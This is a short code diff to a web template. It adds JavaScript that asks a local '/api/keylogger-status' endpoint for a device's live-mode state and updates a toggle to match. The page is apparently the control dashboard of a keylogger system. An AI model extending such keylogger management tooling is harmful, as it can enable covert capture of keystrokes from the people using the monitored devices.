@@ -375,6 +375,25 @@
       deviceId: deviceId,
       isLiveMode: isLiveMode
     });
+
+    // Fetch real live status from device asynchronously
+    const csrfMeta = document.querySelector('meta[name="csrf-token"]');
+    const csrfToken = csrfMeta ? csrfMeta.getAttribute('content') : '';
+    fetch(`/api/keylogger-status/${deviceId}`, {
+      headers: { 'X-CSRFToken': csrfToken }
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (data && data.status === 'success') {
+        const liveEnabled = data.live_mode === true;
+        const toggle = document.getElementById('liveToggle');
+        if (toggle && toggle.checked !== liveEnabled) {
+          toggle.checked = liveEnabled;
+          toggle.dispatchEvent(new Event('change'));
+        }
+      }
+    })
+    .catch(() => { /* device unreachable — keep default */ });
   });
 </script>
 {% endblock extra_js %}
